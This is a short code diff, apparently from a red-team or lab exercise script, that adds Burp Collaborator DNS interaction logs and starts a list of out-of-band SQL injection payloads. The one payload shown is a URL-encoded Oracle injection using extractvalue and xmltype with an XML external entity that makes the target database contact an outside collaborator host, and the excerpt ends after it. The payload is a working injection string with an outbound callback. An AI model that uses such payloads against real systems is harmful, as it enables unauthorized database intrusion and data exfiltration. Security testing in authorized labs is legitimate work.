@@ -1,6 +1,15 @@
 from redteam import RedTeam
 import requests
 
+"""
+from burpcollaborator client:
+
+1	2021-Oct-15 06:37:34 UTC	DNS	1bdfq8rj3r6zs9dx9g4idi6kkbqde2	
+2	2021-Oct-15 06:37:34 UTC	DNS	1bdfq8rj3r6zs9dx9g4idi6kkbqde2	
+3	2021-Oct-15 06:37:34 UTC	DNS	1bdfq8rj3r6zs9dx9g4idi6kkbqde2	
+
+"""
+
 sqli_payloads_oast = [
 
 '(select%20extractvalue(xmltype(\'%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20fppja%20SYSTEM%20%22http%3a%2f%2fwxxac3depmsue4zsvbqdzdsf66c90y.burpcollab\'%7c%7c\'orator.net%2f%22%3e%25fppja%3b]%3e\')%2c\'%2fl\')%20from%20dual)',
